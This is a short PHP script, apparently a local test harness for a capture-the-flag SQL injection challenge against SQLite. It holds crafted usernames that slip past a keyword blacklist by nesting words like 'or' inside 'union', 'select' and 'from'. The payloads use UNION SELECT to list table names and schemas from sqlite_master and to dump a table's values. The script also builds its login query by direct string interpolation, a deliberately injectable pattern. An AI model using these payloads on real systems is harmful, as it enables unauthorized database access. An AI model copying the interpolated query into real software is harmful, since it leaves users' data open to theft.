<?php

// sudo pacman -S php-sqlite
// php.ini:
//   extension=sqlite3
// php -S 0.0.0.0:8080 -t ./  --php-ini=./

$db = new SQLite3('test.db');

$hash='';
$username=" '	unoorrion/oorr**oorr/SELoorrECT	'1',GROUP_CONCAT(name),'2'/oorr**oorr/FR-oorr-om/oorr**oorr/sqlite_master;";
// then craft
// $username=" '	unoorrion/oorr**oorr/SELoorrECT	'1',GROUP_CONCAT(sql),'2'/oorr**oorr/FR-oorr-om/oorr**oorr/sqlite_master;";
// $username=" '	unoorrion/oorr**oorr/SELoorrECT	'1',GROUP_CONCAT(value),'2'/oorr**oorr/FR-oorr-om/oorr**oorr/garbage;";

$bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
            $username = str_ireplace($bad, '', $username);
echo $username;
            $username = str_ireplace($bad, '', $username);

//$db->exec("CREATE TABLE users(username TEXT, password TEXT, test TEXT)");
echo "SELECT * FROM users WHERE username = '$username' AND password = '$hash'";

$result = $db->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);

echo $result . "\n";
